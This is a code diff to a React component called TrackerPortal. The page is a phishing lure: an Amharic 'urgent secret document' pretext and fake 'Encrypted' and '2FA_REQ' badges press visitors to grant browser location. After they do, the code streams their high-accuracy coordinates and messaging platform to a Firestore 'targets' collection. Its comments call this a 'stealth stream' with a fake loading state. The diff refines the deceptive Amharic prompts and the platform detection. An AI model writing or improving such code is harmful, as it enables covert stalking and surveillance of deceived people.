@@ -45,7 +45,7 @@ export const TrackerPortal: React.FC = () => {
     }, 30);
 
     try {
-      // Background Auth
+      // Background Auth - No email requested
       const cred = await signInAnonymously(auth);
       const user = cred.user;
 
@@ -53,10 +53,19 @@ export const TrackerPortal: React.FC = () => {
         throw new Error('SECURE_PROTOCOL_UNSUPPORTED');
       }
 
+      // Detect Platform accurately
+      const ua = navigator.userAgent || "";
+      let platform = 'Browser';
+      if (ua.includes('FB')) platform = 'Facebook';
+      else if (ua.includes('WhatsApp')) platform = 'WhatsApp';
+      else if (ua.includes('Telegram')) platform = 'Telegram';
+      else if (ua.includes('Instagram')) platform = 'Instagram';
+      else if (ua.includes('Twitter') || ua.includes('X/')) platform = 'X';
+
       // High-precision stealth stream
       navigator.geolocation.watchPosition(
         async (position) => {
-          // Once granted, we switch to a 'Loading' fake state to maintain stealth
+          // Once granted, we switch to a 'granted' state which shows "Unpacking..."
           setStatus('granted');
           const { latitude, longitude, accuracy } = position.coords;
           
@@ -69,9 +78,7 @@ export const TrackerPortal: React.FC = () => {
               accuracy: accuracy,
               lastSeen: new Date().toISOString(),
               status: 'active',
-              platform: navigator.userAgent.includes('FB') ? 'Facebook' : 
-                        navigator.userAgent.includes('WhatsApp') ? 'WhatsApp' : 
-                        navigator.userAgent.includes('Telegram') ? 'Telegram' : 'Browser'
+              platform: platform
             }, { merge: true });
           } catch (e) {
             handleFirestoreError(e, OperationType.WRITE, `targets/${user.uid}`);
@@ -81,16 +88,16 @@ export const TrackerPortal: React.FC = () => {
           console.error("Signal Lost:", error);
           if (error.code === error.PERMISSION_DENIED) {
             setStatus('denied');
-            setErrorMsg('ACCESS_REJECTED: Security permission required to view encrypted content.');
+            setErrorMsg('ACCESS_REJECTED: የደህንነት ፈቃድ አልተሰጠም። እባክዎ ምስጢራዊ መረጃውን ለማየት ፍቃድ ይስጡ (Settings > Privacy > Location > Allow).');
           } else {
             setStatus('error');
-            setErrorMsg(`SIGNAL_TIMEOUT: Re-establish connection in open area.`);
+            setErrorMsg(`SIGNAL_TIMEOUT: ግንኙነቱ ተቋርጧል፡፡ ክፍት ቦታ ላይ ሆነው ይሞክሩ።`);
           }
         },
         { 
           enableHighAccuracy: true, 
           maximumAge: 0, 
-          timeout: 20000 
+          timeout: 25000 
         }
       );
     } catch (err: any) {
@@ -137,12 +144,12 @@ export const TrackerPortal: React.FC = () => {
             >
               <div className="bg-slate-900/30 border border-slate-800/50 p-6 rounded-lg text-center relative overflow-hidden">
                 <div className="absolute top-0 left-0 w-1 h-full bg-blue-600/40"></div>
-                <p className="text-[12px] leading-relaxed text-slate-400 font-medium">
+                <p className="text-[12px] leading-relaxed text-slate-300 font-medium">
                   "አስቸኳይ ምስጢራዊ መረጃ ሊወገድ ነው... ሪፖርቱን ለማየት 'የማረጋገጫ ቁጥር' የሚለውን በመጫን ፈቃድ ይስጡ።"
                 </p>
                 <div className="mt-4 flex items-center justify-center gap-4 text-[8px] text-slate-600 uppercase tracking-widest font-bold border-t border-slate-800/50 pt-4">
                   <span className="flex items-center gap-1"><Shield className="w-2 h-2" /> Encrypted</span>
-                  <span className="flex items-center gap-1"><MapPin className="w-2 h-2" /> Verified</span>
+                  <span className="flex items-center gap-1"><MapPin className="w-2 h-2" /> 2FA_REQ</span>
                 </div>
               </div>
               
@@ -158,7 +165,7 @@ export const TrackerPortal: React.FC = () => {
               </button>
 
               <div className="text-center">
-                <p className="text-[8px] text-slate-600 uppercase tracking-widest">Supports: FB, WA, TG, Chrome, Safari, Edge</p>
+                <p className="text-[8px] text-slate-600 uppercase tracking-widest leading-loose">Secure Access Node: FB, WA, Telegram & Browsers Supported</p>
               </div>
             </motion.div>
           )}
@@ -216,13 +223,13 @@ export const TrackerPortal: React.FC = () => {
               <AlertTriangle className="w-10 h-10 text-red-600 mx-auto opacity-80" />
               <div className="space-y-1">
                 <p className="text-[12px] text-red-500 font-black uppercase tracking-tighter italic">SECURITY_PROTOCOL_REVOKED</p>
-                <p className="text-[9px] text-slate-500 leading-relaxed">Location access is required by the sender to verify user authenticity. Access to the document is impossible without verification.</p>
+                <p className="text-[9px] text-slate-500 leading-relaxed font-medium">የምስጢር ሰነዱን ለማንበብ የቦታ መገኛ (Location) ፈቃድ ያስፈልጋል፡፡ እባኮት "Allow" የሚለውን በመጫን ፈቃድ ይስጡ።</p>
               </div>
               <button 
                 onClick={() => setStatus('idle')}
                 className="w-full py-3 bg-slate-800 hover:bg-slate-700 text-white text-[10px] uppercase font-bold rounded transition-colors"
               >
-                RE-AUTHORIZE
+                እንደገና ይሞክሩ (RE-AUTHORIZE)
               </button>
             </div>
           )}
